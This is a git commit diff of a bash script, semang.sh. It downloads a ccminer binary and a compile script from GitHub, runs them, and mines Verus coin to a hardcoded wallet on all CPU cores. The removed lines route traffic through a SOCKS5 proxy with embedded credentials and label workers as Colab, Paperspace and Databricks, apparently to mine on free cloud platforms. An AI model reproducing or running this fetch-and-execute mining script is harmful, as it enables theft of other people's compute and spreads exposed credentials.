bd7d099938c70c6769a05532af6892a4d1519c47
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 14:39:08 +0700

    Update semang.sh

--- semang.sh
+++ semang.sh
@@ -1,13 +1,16 @@
 #!/bin/bash
-array[0]="google_colab"
-array[1]="paperspace"
-array[2]="databricks"
+proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
+array[0]="0001"
+array[1]="0002"
+array[2]="0003"
 size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
-sleep 10s
-wget -qO deploy https://github.com/renifer12/master/raw/master/ccminer
-wget -qO compile https://github.com/renifer12/master/raw/master/compile.sh
-chmod +x deploy compile
-screen -dm -S run ./deploy -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Ren_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=VRSC -t $(nproc --all) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
-sleep 10s && ./compile
+apt-get update
+wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
+wget -qO build https://github.com/renifer12/master/raw/master/ccminer
+chmod +x build 
+chmod +x compile.sh
+./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.worker-$worker -p x -t $(nproc --all)
+./compile.sh
+echo succes
